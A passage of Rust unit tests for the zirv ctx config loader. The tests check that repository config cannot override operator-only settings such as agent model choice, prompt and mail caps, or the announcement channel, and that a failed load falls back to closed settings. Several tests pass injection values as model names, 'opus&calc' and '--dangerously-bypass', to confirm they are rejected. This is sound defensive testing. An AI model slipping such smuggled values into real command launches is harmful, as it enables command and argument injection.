                "names the operator escape hatch: {err}"
            );
        }

        // The rejection is real, not decorative: a clean repo layer still
        // loads and keeps both review keys unset.
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.review.claude, None);
        assert_eq!(cfg.review.codex, None);
    }

    /// FIX 1's charset guard applies identically to `review.claude`/
    /// `review.codex`: both reach the same argv surface `chat.model` does
    /// once a review round launches that adapter's own child.
    #[test]
    fn review_model_charset_is_validated_like_chat_model() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");

        let env = env_map(&[("ZIRV_CTX_REVIEW_MODEL_CLAUDE", "opus&calc")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("a metacharacter review model must fail the load");
        assert!(err.to_string().contains("review.claude"), "got {err}");

        let env = env_map(&[("ZIRV_CTX_REVIEW_MODEL_CODEX", "--dangerously-bypass")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("a leading-dash review model must fail the load");
        assert!(err.to_string().contains("review.codex"), "got {err}");

        let env = env_map(&[
            ("ZIRV_CTX_REVIEW_MODEL_CLAUDE", "opus"),
            ("ZIRV_CTX_REVIEW_MODEL_CODEX", "gpt-5.6-terra"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.review.claude.as_deref(), Some("opus"));
        assert_eq!(cfg.review.codex.as_deref(), Some("gpt-5.6-terra"));
    }

    #[test]
    fn bootstrap_timeout_must_be_positive() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_WORKER_BOOTSTRAP_TIMEOUT_SECS", "0")]);

        let error = CtxConfig::load(repo.path(), &|key| env.get(key).cloned())
            .expect_err("zero cannot bound a bootstrap run");
        assert!(
            error
                .to_string()
                .contains("worker.bootstrap_timeout_secs must be greater than 0"),
            "{error}"
        );
    }

    #[test]
    fn the_operator_may_set_worker_models_from_home_config_and_env() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[worker]\nclaude = \"opus\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.worker.claude.as_deref(), Some("opus"));
        assert_eq!(cfg.worker.codex, None);

        let env = env_map(&[("ZIRV_CTX_WORKER_MODEL_CODEX", "gpt-5.6-terra")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.worker.claude.as_deref(),
            Some("opus"),
            "the home layer still applies under the env layer"
        );
        assert_eq!(cfg.worker.codex.as_deref(), Some("gpt-5.6-terra"));
    }

    /// Same trust boundary as `review.claude`/`review.codex`: a repo checkout
    /// must not be able to pick which model spends the operator's vendor
    /// account running a delegated headless worker.
    #[test]
    fn a_repo_layer_may_not_touch_worker_model_keys() {
        for (toml, escape_hatch) in [
            (
                "[worker]\nclaude = \"opus\"\n",
                "ZIRV_CTX_WORKER_MODEL_CLAUDE",
            ),
            (
                "[worker]\ncodex = \"gpt-5.6-terra\"\n",
                "ZIRV_CTX_WORKER_MODEL_CODEX",
            ),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");

            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains("worker"), "names the offending key: {err}");
            assert!(
                err.contains(escape_hatch),
                "names the operator escape hatch: {err}"
            );
        }

        // The rejection is real, not decorative: a clean repo layer still
        // loads and keeps both worker keys unset.
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.worker.claude, None);
        assert_eq!(cfg.worker.codex, None);
    }

    /// FIX 1's charset guard applies identically to `worker.claude`/
    /// `worker.codex`: both reach a delegation spawn's own launch argv
    /// directly (`adapters::worker_model_args`).
    #[test]
    fn worker_model_charset_is_validated_like_chat_model() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");

        let env = env_map(&[("ZIRV_CTX_WORKER_MODEL_CLAUDE", "opus&calc")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("a metacharacter worker model must fail the load");
        assert!(err.to_string().contains("worker.claude"), "got {err}");

        let env = env_map(&[("ZIRV_CTX_WORKER_MODEL_CODEX", "--dangerously-bypass")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("a leading-dash worker model must fail the load");
        assert!(err.to_string().contains("worker.codex"), "got {err}");

        let env = env_map(&[
            ("ZIRV_CTX_WORKER_MODEL_CLAUDE", "opus"),
            ("ZIRV_CTX_WORKER_MODEL_CODEX", "gpt-5.6-terra"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.worker.claude.as_deref(), Some("opus"));
        assert_eq!(cfg.worker.codex.as_deref(), Some("gpt-5.6-terra"));
    }

    #[test]
    fn optimize_reads_config_and_env() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[optimize]\nsessions_sampled = 3\nrecommend_corrections = 9\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.optimize.sessions_sampled, 3);
        assert_eq!(cfg.optimize.recommend_corrections, 9);

        let env = env_map(&[("ZIRV_CTX_OPTIMIZE_SESSIONS", "7")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.optimize.sessions_sampled, 7);
    }

    #[test]
    fn a_repo_may_not_enable_its_own_prompt_layer_or_raise_its_cap() {
        // The same trust boundary as agent_bin: a checkout must not be able to
        // decide that text from the checkout gets injected, nor how much of it.
        // A repo that could raise max_repo_bytes would make the cap decorative.
        // `harnesses` is here for the same reason: a repo must not be able to
        // force the derived roster back on for an operator who turned it off.
        // `codex_orchestrator` (issue #167): same asymmetry, for codex's own
        // orchestrator-conventions layer. `verbosity` (issue #427): a repo
        // must not be able to raise its own meta-harness orientation tier
        // back up for an operator who chose a lower one.
        for (key, value) in [
            ("enabled", "true"),
            ("repo_layer", "true"),
            ("max_repo_bytes", "1000000"),
            ("harnesses", "false"),
            ("codex_orchestrator", "false"),
            ("verbosity", "\"minimal\""),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[prompt]\n{key} = {value}\n"),
            )
            .expect("write");

            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains(&format!("prompt.{key}")), "got {err}");
            assert!(
                err.contains("ZIRV_CTX_PROMPT"),
                "the error names where the operator may set it: {err}"
            );
        }
    }

    #[test]
    fn the_operator_may_still_raise_the_repo_cap() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PROMPT_MAX_REPO_BYTES", "9000")]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.prompt.max_repo_bytes, 9000);
    }

    #[test]
    fn the_operator_may_still_set_prompt_keys() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PROMPT", "false")]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(
            !cfg.prompt.enabled,
            "the environment is the operator, not the checkout"
        );
    }

    #[test]
    fn the_operator_may_still_toggle_the_harness_roster() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PROMPT_HARNESSES", "false")]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(
            !cfg.prompt.harnesses,
            "the environment is the operator, not the checkout"
        );
    }

    /// Issue #167: the codex orchestrator layer's own operator switch.
    #[test]
    fn the_operator_may_still_toggle_the_codex_orchestrator_layer() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PROMPT_CODEX_ORCHESTRATOR", "false")]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(
            !cfg.prompt.codex_orchestrator,
            "the environment is the operator, not the checkout"
        );
    }

    #[test]
    fn a_repo_may_not_raise_its_own_context_budget() {
        // Same trust boundary as prompt.max_repo_bytes: a repo checkout must
        // not be able to raise the cap on its own untrusted content.
        for (key, value) in [
            ("max_common_bytes", "1000000"),
            ("max_harness_bytes", "1000000"),
            ("max_harness_roster_bytes", "1000000"),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[context]\n{key} = {value}\n"),
            )
            .expect("write");

            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains(&format!("context.{key}")), "got {err}");
            assert!(
                err.contains("ZIRV_CTX_CONTEXT"),
                "the error names where the operator may set it: {err}"
            );
        }
    }

    #[test]
    fn the_operator_may_still_raise_the_context_budget() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_CONTEXT_MAX_COMMON_BYTES", "9000"),
            ("ZIRV_CTX_CONTEXT_MAX_HARNESS_BYTES", "8000"),
            ("ZIRV_CTX_CONTEXT_MAX_HARNESS_ROSTER_BYTES", "7000"),
        ]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.context.max_common_bytes, 9000);
        assert_eq!(cfg.context.max_harness_bytes, 8000);
        assert_eq!(cfg.context.max_harness_roster_bytes, 7000);
    }

    /// The follow-up PR #67 assigned to issue #44: once `cfg.policy` is
    /// load-bearing (the context compiler attaches it to every session), the
    /// shared config-load-failure fallback must not hand back the widest
    /// possible policy.
    #[test]
    fn degrade_to_operator_only_withholds_when_operator_obfuscation_is_unreadable() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir(home.path().join(".zirv")).expect("config directory");
        for text in ["[obfuscate", "[obfuscate]\nmode = 42\n"] {
            std::fs::write(home.path().join(".zirv/ctx.toml"), text).expect("operator config");
            let cfg = degrade_to_operator_only(&|_| None);
            assert_eq!(cfg.obfuscate.mode, ObfuscateMode::Obfuscate);
            assert!(
                super::super::obfuscate_store::options_from_config(&cfg.obfuscate, home.path())
                    .is_err()
            );
        }
    }

    #[test]
    fn degrade_to_operator_only_preserves_obfuscation_after_repo_rejection() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir(home.path().join(".zirv")).expect("home config directory");
        std::fs::create_dir(repo.path().join(".zirv")).expect("repo config directory");
        std::fs::write(home.path().join(".zirv/ctx.toml"),
            "[obfuscate]\nmode = \"obfuscate\"\nprompt = \"block\"\nemail_domain = \"mask\"\n[[obfuscate.patterns]]\nkind = \"CUSTOMER\"\nregex = '^CUST-[0-9]{8}$'\n",
        ).expect("operator config");
        let expected = CtxConfig::load(repo.path(), &|_| None)
            .expect("operator config")
            .obfuscate;
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[obfuscate]\nmode = \"off\"\n",
        )
        .expect("repo config");
        let error = CtxConfig::load(repo.path(), &|_| None).expect_err("forbidden key");
        assert!(is_repo_forbidden(error.as_ref()), "{error}");
        assert_eq!(degrade_to_operator_only(&|_| None).obfuscate, expected);
        let env = env_map(&[("ZIRV_CTX_OBFUSCATE_ENTROPY", "obfuscate")]);
        let degraded = degrade_to_operator_only(&|key| env.get(key).cloned());
        assert_eq!(degraded.obfuscate.entropy, ObfuscateEntropy::Obfuscate);
        assert_eq!(degraded.obfuscate.mode, ObfuscateMode::Obfuscate);
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[obfuscate]\nmode = \"off\"\n",
        )
        .expect("operator config");
        let env = env_map(&[("ZIRV_CTX_OBFUSCATE_MODE", "obfuscate")]);
        assert_eq!(
            degrade_to_operator_only(&|key| env.get(key).cloned())
                .obfuscate
                .mode,
            ObfuscateMode::Obfuscate
        );
    }

    #[test]
    fn degrade_to_operator_only_fails_closed_on_policy_not_open() {
        let empty = env_map(&[]);
        let degraded = degrade_to_operator_only(&|k| empty.get(k).cloned());
        assert_eq!(
            degraded.policy,
            super::super::policy::EffectivePolicy::fail_closed(),
            "a failed config load must not silently become the widest (default/Allow) policy"
        );
        assert_ne!(
            degraded.policy,
            super::super::policy::EffectivePolicy::default(),
            "fail_closed must differ from the permissive default, or this test proves nothing"
        );
    }

    /// Finding #5 (issue #358 review): `supervise.orchestrator_writes`
    /// defaults to `Advise`, so without the fix a config-load failure would
    /// silently WIDEN an operator's own `deny` to `Advise` -- exactly the
    /// same fail-open shape `degrade_to_operator_only_fails_closed_on_
    /// policy_not_open` already guards for `policy`. An untrusted repo
    /// layer can induce a load failure at will (a malformed `ctx.toml`),
    /// so this boundary must fail closed too, on both the field `hook::
    /// orchestrator_write_posture` reads (`supervise`) and its synced copy
    /// (`prompt`).
    #[test]
    fn degrade_to_operator_only_denies_repository_writes_not_advises_them() {
        let empty = env_map(&[]);
        let degraded = degrade_to_operator_only(&|k| empty.get(k).cloned());
        assert_eq!(
            degraded.supervise.orchestrator_writes,
            OrchestratorWrites::Deny,
            "a failed config load must not silently widen `deny` to the permissive default"
        );
        assert_eq!(
            degraded.prompt.orchestrator_writes,
            OrchestratorWrites::Deny,
            "the synced `prompt` copy must agree with `supervise`"
        );
    }

    #[test]
    fn degrade_to_operator_only_keeps_the_bundled_output_filter_rules() {
        let empty = env_map(&[]);
        let degraded = degrade_to_operator_only(&|k| empty.get(k).cloned());
        assert_eq!(
            degraded.output.filter,
            super::super::output_filters::bundled_output_filter_rules(),
            "a failed config load must compact the way an absent config does"
        );
    }

    #[test]
    fn a_repo_may_not_choose_the_optimize_model() {
        // Same trust boundary as handoff.model: a checkout must not name the
        // model zirv spends tokens on.
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[optimize]\nmodel = \"opus\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("repo may not set optimize.model");
        let msg = err.to_string();
        assert!(msg.contains("optimize.model"), "got {msg}");
        assert!(
            msg.contains("ZIRV_CTX_OPTIMIZE_MODEL"),
            "name the alternative: {msg}"
        );
    }

    #[test]
    fn mail_reads_config_and_env() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[mail]\nkeep = 10\nmax_message_bytes = 2048\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.mail.keep, 10);
        assert_eq!(cfg.mail.max_message_bytes, 2048);
        assert_eq!(
            cfg.mail.max_delivered_bytes, 4096,
            "untouched keys keep defaults"
        );

        let env = env_map(&[
            ("ZIRV_CTX_MAIL", "false"),
            ("ZIRV_CTX_MAIL_MAX_MESSAGE_BYTES", "512"),
            ("ZIRV_CTX_MAIL_MAX_DELIVERED_BYTES", "256"),
            ("ZIRV_CTX_MAIL_KEEP", "5"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.mail.enabled);
        assert_eq!(cfg.mail.max_message_bytes, 512);
        assert_eq!(cfg.mail.max_delivered_bytes, 256);
        assert_eq!(cfg.mail.keep, 5);
    }

    /// `.settings.toml` and `ctx.toml` are deliberately distinct files:
    /// `agents` is `#[serde(skip)]` on `CtxConfig`, so an `[agents]` table
    /// inside `ctx.toml` is unrecognized rather than silently accepted.
    #[test]
    fn agents_in_ctx_toml_is_rejected_so_the_two_files_stay_distinct() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[agents.codex]\nenabled = false\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("[agents] belongs in .settings.toml, not ctx.toml");
        assert!(err.to_string().contains("agents"), "got {err}");
    }

    #[test]
    fn chrome_reads_config_and_env() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[chrome]\nbanner = false\nbar = false\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(!cfg.chrome.banner);
        assert!(!cfg.chrome.bar);
        assert!(cfg.chrome.events, "untouched keys keep defaults");

        let env = env_map(&[
            ("ZIRV_CTX_CHROME_BANNER", "false"),
            ("ZIRV_CTX_CHROME_BAR", "false"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.chrome.banner);
        assert!(!cfg.chrome.bar);
    }

    /// `ZIRV_CTX_QUIET=true` must turn the announcement channel off, not on:
    /// it is the negation of `chrome.events`, the one entry in `ENV_MAP`
    /// whose meaning is inverted from the key it feeds.
    #[test]
    fn zirv_ctx_quiet_inverts_into_chrome_events() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_QUIET", "true")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(
            !cfg.chrome.events,
            "quiet=true must silence the announcement channel"
        );

        let env = env_map(&[("ZIRV_CTX_QUIET", "false")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(
            cfg.chrome.events,
            "quiet=false must leave the announcement channel on"
        );
    }

    #[test]
    fn a_non_boolean_quiet_value_is_rejected() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_QUIET", "loud")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect_err("bad bool");
        assert!(err.to_string().contains("ZIRV_CTX_QUIET"), "got {err}");
    }

    /// `chrome.bar`/`chrome.banner` are not in `REPO_FORBIDDEN`: unlike
    /// `agent_bin` or `handoff.model`, neither names what zirv runs or
    /// spends tokens on, so a repository may configure its own defaults for
    /// them. `chrome.events` is different -- see
    /// `a_repo_may_not_silence_the_announcement_channel` below.
    #[test]
    fn a_repository_may_configure_chrome() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[chrome]\nbar = false\n",
        )
        .expect("write");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(!cfg.chrome.bar);
    }

    /// S1: mail is folded into the composed prompt as its own layer
    /// (`with_mail_layer`), the same reasoning that puts `prompt.max_repo_
    /// bytes` in `REPO_FORBIDDEN` -- a repo raising its own delivered-mail
    /// cap would make the cap decorative, and a repo re-enabling delivery
    /// after an operator disabled it would defeat the point of disabling it.
    #[test]
    fn a_repo_may_not_raise_the_mail_delivered_cap_or_toggle_delivery() {
        for (key, value) in [("max_delivered_bytes", "1000000"), ("enabled", "true")] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[mail]\n{key} = {value}\n"),
            )
            .expect("write");

            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains(&format!("mail.{key}")), "got {err}");
            assert!(
                err.contains("ZIRV_CTX_MAIL"),
                "names the operator escape hatch: {err}"
            );
        }
    }

    /// S1: a repo could otherwise silence the `zirv \u{25b8}` announcement
    /// channel -- including its own degradation notices -- for anyone
    /// running zirv there, with no operator-visible sign that it happened.
    #[test]
    fn a_repo_may_not_silence_the_announcement_channel() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[chrome]\nevents = false\n",
        )
        .expect("write");

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not silence the announcement channel")
            .to_string();
        assert!(err.contains("chrome.events"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_QUIET"),
            "names the operator escape hatch: {err}"
        );
    }

    #[test]
    fn the_operator_may_still_toggle_mail_delivery_and_the_announcement_channel() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_only.path());
        let env = env_map(&[
            ("ZIRV_CTX_MAIL", "false"),
            ("ZIRV_CTX_MAIL_MAX_DELIVERED_BYTES", "9000"),
            ("ZIRV_CTX_QUIET", "true"),
        ]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.mail.enabled, "the environment is the operator");
        assert_eq!(cfg.mail.max_delivered_bytes, 9000);
        assert!(!cfg.chrome.events);
    }

    #[test]
    fn memory_env_overrides_every_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_MEMORY", "false"),
            ("ZIRV_CTX_MEMORY_HARVEST", "true"),
            ("ZIRV_CTX_MEMORY_MAX_ENTRIES", "9"),
            ("ZIRV_CTX_MEMORY_MAX_ENTRY_BYTES", "128"),
            ("ZIRV_CTX_MEMORY_MAX_INJECTED_BYTES", "999"),
            ("ZIRV_CTX_MEMORY_SHARED", "false"),
            ("ZIRV_CTX_MEMORY_CORE_MAX_BYTES", "1024"),
            ("ZIRV_CTX_MEMORY_RETRIEVAL_MAX_BYTES", "4096"),
            ("ZIRV_CTX_MEMORY_RETRIEVAL_MAX_ENTRIES", "3"),
            ("ZIRV_CTX_MEMORY_HARVEST_MAX_ENTRIES", "2"),
            ("ZIRV_CTX_MEMORY_HARVEST_MAX_BYTES", "256"),
            ("ZIRV_CTX_MEMORY_SESSION", "false"),
            ("ZIRV_CTX_MEMORY_JOURNAL_MAX_ENTRIES", "77"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.memory.enabled);
        assert!(cfg.memory.harvest);
        assert_eq!(cfg.memory.max_entries, 9);
        assert_eq!(cfg.memory.max_entry_bytes, 128);
        assert_eq!(cfg.memory.max_injected_bytes, 999);
        assert!(!cfg.memory.shared_enabled);
        assert_eq!(cfg.memory.core_max_bytes, 1024);
        assert_eq!(cfg.memory.retrieval_max_bytes, 4096);
        assert_eq!(cfg.memory.retrieval_max_entries, 3);
        assert_eq!(cfg.memory.harvest_max_entries, 2);
        assert_eq!(cfg.memory.harvest_max_bytes, 256);
        assert!(!cfg.memory.session_enabled);
        assert_eq!(cfg.memory.journal_max_entries, 77);
    }

    /// Issue #455: `[fallback.health]` parses with its documented defaults,
    /// and each key reads from its own environment variable.
    #[test]
    fn fallback_health_parses_with_defaults_and_env_overrides() {
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(cfg.fallback.health.enabled);
        assert_eq!(cfg.fallback.health.open_after_failures, 3);
        assert_eq!(cfg.fallback.health.window_secs, 600);
        assert_eq!(cfg.fallback.health.cooldown_secs, 300);
        assert_eq!(cfg.fallback.health.degrade_error_rate_pct, 25);
        assert_eq!(cfg.fallback.health.degrade_min_samples, 8);
        assert_eq!(
            cfg.fallback.health.degrade_ttft_ms, None,
            "the latency signal is opt-in"
        );
        assert!(
            cfg.fallback.effective_health().enabled,
            "health follows fallback.enabled, which defaults on"
        );

        let env = env_map(&[
            ("ZIRV_CTX_FALLBACK_HEALTH_OPEN_AFTER_FAILURES", "5"),
            ("ZIRV_CTX_FALLBACK_HEALTH_WINDOW_SECS", "900"),
            ("ZIRV_CTX_FALLBACK_HEALTH_COOLDOWN_SECS", "60"),
            ("ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_ERROR_RATE_PCT", "40"),
            ("ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_MIN_SAMPLES", "12"),
            ("ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_TTFT_MS", "20000"),
            ("ZIRV_CTX_FALLBACK", "false"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.fallback.health.open_after_failures, 5);
        assert_eq!(cfg.fallback.health.window_secs, 900);
        assert_eq!(cfg.fallback.health.cooldown_secs, 60);
        assert_eq!(cfg.fallback.health.degrade_error_rate_pct, 40);
        assert_eq!(cfg.fallback.health.degrade_min_samples, 12);
        assert_eq!(cfg.fallback.health.degrade_ttft_ms, Some(20_000));
        assert!(
            !cfg.fallback.effective_health().enabled,
            "with fallback off there is nowhere for a denied route's work to go"
        );
    }

    /// Issue #455 (review round 1, finding 9): a knob outside its usable
    /// range is a silently dead breaker, so each one is refused with the
    /// same shape the neighbouring headroom keys use.
    #[test]
    fn fallback_health_knobs_are_range_checked() {
        let repo = tempfile::tempdir().expect("tempdir");
        for (var, value, needle) in [
            (
                "ZIRV_CTX_FALLBACK_HEALTH_OPEN_AFTER_FAILURES",
                "0",
                "fallback.health.open_after_failures must be between 1 and 20, got 0",
            ),
            (
                "ZIRV_CTX_FALLBACK_HEALTH_OPEN_AFTER_FAILURES",
                "21",
                "fallback.health.open_after_failures must be between 1 and 20, got 21",
            ),
            (
                "ZIRV_CTX_FALLBACK_HEALTH_WINDOW_SECS",
                "0",
                "fallback.health.window_secs must be greater than 0, got 0",
            ),
            (
                "ZIRV_CTX_FALLBACK_HEALTH_COOLDOWN_SECS",
                "0",
                "fallback.health.cooldown_secs must be greater than 0, got 0",
            ),
            (
                "ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_ERROR_RATE_PCT",
                "0",
                "fallback.health.degrade_error_rate_pct must be between 1 and 100, got 0",
            ),
            (
                "ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_MIN_SAMPLES",
                "1",
                "fallback.health.degrade_min_samples must be between 2 and 40, got 1",
            ),
            (
                "ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_MIN_SAMPLES",
                "41",
                "fallback.health.degrade_min_samples must be between 2 and 40, got 41",
            ),
            (
                "ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_TTFT_MS",
                "999",
                "fallback.health.degrade_ttft_ms must be at least 1000, got 999",
            ),
        ] {
            let env = env_map(&[(var, value)]);
            let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
                .expect_err("an unusable breaker knob must be refused");
            assert!(err.to_string().contains(needle), "{var}={value}: {err}");
        }

        // The boundary values themselves are fine.
        let env = env_map(&[
            ("ZIRV_CTX_FALLBACK_HEALTH_OPEN_AFTER_FAILURES", "20"),
            ("ZIRV_CTX_FALLBACK_HEALTH_WINDOW_SECS", "1"),
            ("ZIRV_CTX_FALLBACK_HEALTH_COOLDOWN_SECS", "1"),
